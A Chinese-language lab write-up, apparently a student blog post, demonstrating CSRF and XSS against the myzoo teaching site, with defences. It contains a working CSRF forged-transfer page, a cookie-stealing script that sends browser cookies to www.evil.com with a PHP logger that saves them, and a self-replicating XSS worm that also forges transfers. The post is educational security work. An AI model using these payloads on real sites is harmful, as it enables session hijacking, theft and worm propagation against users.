---
layout: post
title: InfoSec:CSRF&XSS
category: InfoSec_LAB
description: InfoSec:CSRF&XSS
published: true
---

## 实验介绍
本次实验需要实现

- CSRF的攻击及防护
- XSS攻击和XSS蠕虫

### CSRF
CSRF（Cross-site request forgery）跨站请求伪造攻击是利用浏览器会保存用户cookie的特点，在用户登录了受信任网站后，引诱用户点击恶意网站，而此时网站中已经写好向用户已登陆的网站的服务器提交请求的代码，用户点击之后，如果该网站没有进行防护，又因为此时的请求带有用户的cookie，则无法判断该请求是用户发出还是恶意网站发出，就会在用户不知情的情况下完成一个操作。

### XSS
XSS（Cross Site Script Attack）是通过向用户使用的页面注入代码，让浏览器执行，从而达到攻击的目的。注入的方式如在公共论坛中，写入html或者JavaScript代码，使得浏览器渲染时把这些字符串当作标签，其他用户在打开该页面时就会执行这些代码。

## 实验平台
Ubuntu 16.04 虚拟机
FireFox 浏览器

## 实验步骤
### 实验网站
[下载地址](https://github.com/WindMelon/Myzoo/tree/master)
[环境配置](https://www.cnblogs.com/pualus/p/6829644.html)
网站使用Stanford WebScurity课程的myzoo，基于php

该网站实现了

- 用户注册/登陆
- 用户个人页面profile
- 用户间相互转账

![image.png-1096.7kB][1]

![image.png-328.2kB][2]

![image.png-400.4kB][3]

![image.png-368.1kB][4]

### 一个简单的CSRF
我们首先尝试实现一个简单的CSRF，再实现防护的方法
这个CSRF实现了正常用户查看attacker用户的profile，如果点击了profile中的链接，则会自动转2个zoobar给attacker

我们首先看看转账过程发生了什么，通过浏览器抓包，可以看到点击send后发生了什么

![image.png-439.6kB][5]

可以看到发送了一个POST请求，点开

![image.png-183.7kB][6]

可以看到在请求头中带有cookie，这个是登陆之后浏览器自动带上的，只要用户的cookie还有效，就不需要我们操心

![image.png-91.5kB][7]

而关键就是这三个参数，将这三个参数和值提交给www.myzoo.com/transfer.php即完成了一次转账，那么我们就可以写一个攻击页面www.evil.com，内容为

```
<form method=POST name=transferform
  action="http://www.myzoo.com/transfer.php" id="form">
<input name=zoobars type=hidden value="2">
<input name=recipient type=hidden value="attacker">
<input type=hidden name=submission value="Send">
</form>

<script>
  alert("congrats!your zoobars have been stolen!");
  var form = document.getElementById('form');
  form.submit();
</script>
```

同时，将attacker的profile更改为

```
<a href="http://www.evil.com" target="view_window">clickit</a>
```

那么普通用户查看attacker时，就会看到以下界面

![image.png-400.5kB][8]

profile里面是一个链接，只要用户好奇点击以下，就会转2个zoobar给attacker

![image.png-50.8kB][9]

![image.png-398.5kB][10]

###简单的CSRF防护
防护CSRF的方法很多，可以使用验证码，可以验证referer网站，也可以在用户登陆网站时生成一个随机的token，在后续提交表单的时候也提交这个随机的token。

这里使用token验证防护CSRF

注意，这里的token是一个全局变量，也就是不管用户访问该网站的哪个页面，只要用户保持登陆状态，这个token都必须是一样的，实现的方法就是开启一个会话（session）

在每个php文件的开头添加如下，就可以使所有页面处于一个会话状态之下，共享一个全局变量`$_SESSION`
```
<?php session_start(); ?>
```

这里我们需要实现的效果是，每次transfer使用的token都不同，所以必须在transfer.php页面写上
```
$_SESSION["csrf"] = md5(uniqid(mt_rand(), true));
```

然而这样还不够，因为要保证提交的表单和当前token的一致性，只能在提交之后再刷新当前token，那么第一次的token生成就必须在其他页面，这里我写在了auth.php页面，也就是每一次登陆就生成一个token
在auth.php中

![image.png-37.1kB][11]

在transfer.php中

![image.png-16.4kB][12]

同时添加一个隐藏的表单项

![image.png-12.6kB][13]

测试一下，正常转账

![image.png-373kB][14]

点击恶意链接前

![image.png-329.6kB][15]

点击恶意链接后

![image.png-331.4kB][16]

### 一个偷走Cookie的XSS攻击
接下来是XSS攻击，XSS攻击不需要受攻击者点击额外的页面，而是直接在用户常浏览的网页中注入代码，当用户浏览到此时，就会执行注入的代码，达到攻击者的目的

原网站中已经进行了XSS防护，即通过禁止插入某些标签和关键词的方式，这里为了降低实验难度，放开`<script>`标签的使用限制，在user.php中，在allowed_tag后面增加一个`<script>`标签

![image.png-15.7kB][17]

为了区别于CSRF，在这里注册了一个新用户attacer2

此外，为了实现偷走cookie，还得写一个页面用于将用户cookie写到文件中

```
<?php
$myfile = fopen("/home/zhanhao/cookies.txt", "a+");
$cookie = $_GET["cookie"];
echo $cookie;
fwrite($myfile, $cookie);
fwrite($myfile,"\n");
fclose($myfile);
?>
```

然后将attacker2的profile改为

```
<script>
document.write(\'<img src = "http://www.evil.com/stealcookie.php?cookie=\');
document.write(document.cookie);
document.write(\'"></img>\');
</script>
```

这段代码的意思即将用户的cookie当作get请求的关键字value传向刚刚写好的恶意页面，当正常用户查看attacker2的profile时，自己的cookie就会被偷走

![image.png-374.9kB][18]

![image.png-404.6kB][19]

![image.png-18kB][20]

### 针对Cookie的防护
如果不想用户的cookie被这种方式盗窃，则需要网页程序员进行一定的改进

通过将cookie设置为HttpOnly，则不可以通过JavaScript访问到该cookie

在auth.php中修改setcookie

![image.png-10.8kB][21]

再次打开attacker2的profile

![image.png-400.1kB][22]

![image.png-10.3kB][23]

可以看到只有PHPSESSID这个cookie了，因为这个cookie是php使用`session_start()`自动创建的cookie，所以并不重要，重要的和登陆相关的zoobarlogin已经不能被读取了

### XSS蠕虫
接下来要实现一个高级一点的XSS攻击，即XSS蠕虫
XSS蠕虫的意思即可以实现感染，当用户浏览攻击者的profile时，自己的profile也会被更改，以此类推，XSS蠕虫将一层层感染更多的人

这主要也是通过注入代码实现的，我们先实现简单的感染功能，将attacker3的profile更改如下
```
<span id="hack">
<script>
var str = "<span id=hack>";
str += document.getElementById("hack").innerHTML + "</span>";
var turnForm = document.createElement("form");   
document.body.appendChild(turnForm);
turnForm.method = "post";
turnForm.action = "/index.php";
var newElement = document.createElement("input");
newElement.setAttribute("name","profile_update");
newElement.setAttribute("type","hidden");
newElement.setAttribute("value",str);
turnForm.appendChild(newElement);
var newElement2 = document.createElement("input");
newElement2.setAttribute("name","profile_submit");
newElement2.setAttribute("type","hidden");
newElement2.setAttribute("value","Save");
turnForm.appendChild(newElement2);
turnForm.submit();
</script>
</span>
```

这串代码干的事情如下，当用户查看attacker3的profile时

1. 构建一个表格，格式和修改profile页面的一致
2. 构建一个字符串，字符串内容是这串代码本身
3. 提交请求，完成profile修改

测试下效果

普通用户原来的profile

![image.png-329.2kB][24]

查看attacker3的profile之后

![image.png-345.9kB][25]

profile已被修改得和attacker3一样，当其他用户查看此用户的profile也会被感染，这就达到了递进传播的效果

这里只是简单的实现了感染的功能，通过添加代码可以实现增加攻击，这样就能够实现具有攻击性和感染性的XSS蠕虫

例，一个偷zoobar的XSS蠕虫，使用xmlhttp发送了一个转账申请

```
<span id=hack>
<script>
        xmlhttp=new XMLHttpRequest();
        xmlhttp.open("POST","http://www.myzoo.com/transfer.php",false);
        xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
        xmlhttp.send("zoobars=1&recipient=attacker3&submission=Send");
var str = "<span id=hack>";
str += document.getElementById("hack").innerHTML + "</span>";
var turnForm = document.createElement("form");   
document.body.appendChild(turnForm);
turnForm.method = "post";
turnForm.action = "/index.php";
var newElement = document.createElement("input");
newElement.setAttribute("name","profile_update");
newElement.setAttribute("type","hidden");
newElement.setAttribute("value",str);
turnForm.appendChild(newElement);
var newElement2 = document.createElement("input");
newElement2.setAttribute("name","profile_submit");
newElement2.setAttribute("type","hidden");
newElement2.setAttribute("value","Save");
turnForm.appendChild(newElement2);
turnForm.submit();
</script>
</span>
```

因为偷zoobar的漏洞之前已经做了防护，效果就不展示了

### XSS蠕虫的防护
类似于CSRF，XSS蠕虫也是利用浏览器在发http请求的时候会自动带上cookie导致服务器端无法识别是用户自己的请求还是恶意代码，所以防护方式可以通过添加token域进行验证，或者禁用一些标签例如`<script>`就可以了


  [1]: http://static.zybuluo.com/windmelon/wb811isbgudgxpwq3gql295l/image.png
  [2]: http://static.zybuluo.com/windmelon/wyx5ihu7231uhd2z4zen96v0/image.png
  [3]: http://static.zybuluo.com/windmelon/459nrgijj9fcfe1mnwmocwaz/image.png
  [4]: http://static.zybuluo.com/windmelon/4apbtvxowy8byf2r8sy00vwc/image.png
  [5]: http://static.zybuluo.com/windmelon/zhv22vh8kiee315pynnekpay/image.png
  [6]: http://static.zybuluo.com/windmelon/oyxu17g61e73obkuqpicdt5s/image.png
  [7]: http://static.zybuluo.com/windmelon/zueizan9qwib440o3u7e65r1/image.png
  [8]: http://static.zybuluo.com/windmelon/yuz8tlyumpk4iley96kh2zat/image.png
  [9]: http://static.zybuluo.com/windmelon/4sl9akwn8wkif8saiz18ych2/image.png
  [10]: http://static.zybuluo.com/windmelon/an7u931j8d3k2kloew2dqx4s/image.png
  [11]: http://static.zybuluo.com/windmelon/cm5fhx4rqefxyqgf9bf54mye/image.png
  [12]: http://static.zybuluo.com/windmelon/onasvozrwzjeke0v79ou4gf6/image.png
  [13]: http://static.zybuluo.com/windmelon/f2p365lanf3o5z0m81oissef/image.png
  [14]: http://static.zybuluo.com/windmelon/td0ujhhpj98huuavszqte7af/image.png
  [15]: http://static.zybuluo.com/windmelon/e2i42q655dvysq1vzib6db4o/image.png
  [16]: http://static.zybuluo.com/windmelon/oh1qedj7ib0l4zassgjw3egx/image.png
  [17]: http://static.zybuluo.com/windmelon/uztoeycovas7djn70ufmnxv6/image.png
  [18]: http://static.zybuluo.com/windmelon/1ukhzrrze1yfio0jr0dfecot/image.png
  [19]: http://static.zybuluo.com/windmelon/hq9z9c0vqadofbneknehndmu/image.png
  [20]: http://static.zybuluo.com/windmelon/4xzlyz6fwizmhi5cwruwj0fy/image.png
  [21]: http://static.zybuluo.com/windmelon/82u2r6moargordan63iegyl4/image.png
  [22]: http://static.zybuluo.com/windmelon/u1v3flj7eqqdtuadwdggo3b7/image.png
  [23]: http://static.zybuluo.com/windmelon/7zqenr92vyowh26fhqrgn4oi/image.png
  [24]: http://static.zybuluo.com/windmelon/7pg51wksqvjvf8abqrfsrgk7/image.png
  [25]: http://static.zybuluo.com/windmelon/k0r0eu13ls0ig234fwn3tsnj/image.png